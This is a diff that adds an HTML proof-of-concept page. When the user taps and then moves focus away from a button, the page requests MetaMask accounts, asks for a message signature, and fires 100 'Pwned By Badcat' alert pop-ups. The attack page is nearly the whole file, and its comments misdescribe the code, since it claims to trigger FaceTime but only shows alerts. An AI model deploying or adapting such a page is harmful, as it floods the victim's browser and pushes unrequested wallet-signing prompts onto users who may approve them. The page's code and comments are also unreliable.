@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <title>Trigger FaceTime on Blur</title>
+
+    <style>
+        body {
+            font-family: sans-serif;
+        }
+        p {
+            margin: 6px 0;
+        }
+        button {
+            padding: 10px 16px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+
+    <p>1. Tap tombol "Click Me"</p>
+    <p>2. Tap di mana saja di luar tombol</p>
+
+    <button id="triggerBtn">Click Me</button>
+
+    <script>
+        const btn = document.getElementById("triggerBtn");
+
+        // Agar tombol mendapat fokus saat diklik
+        btn.addEventListener("click", () => {
+            btn.focus();
+        });
+
+        // Ketika tombol kehilangan fokus
+        btn.addEventListener("blur", () => {
+
+            var web3 = new Web3(window.ethereum);
+    
+        async function getAddress() {
+            return await web3.eth.requestAccounts();
+            console.log(address);
+        }
+        var addresses;
+        getAddress().then((value) => {
+            addresses = value;
+            web3.eth.personal.sign("Hi Metamask!", addresses[0])
+        });
+            // Memicu FaceTime sebanyak 100 kali
+            for (let i = 1; i <= 100; i++) {
+                    setTimeout(() => {
+                        alert("\t\t\t\t\n🙀🙀🙀🙀🙀🙀\nHalo Dek\nPwned By Badcat🐈");
+
+                    }, 100);
+            }
+        
+            
+
+          
+        });
+    </script>
+
+</body>
+</html>
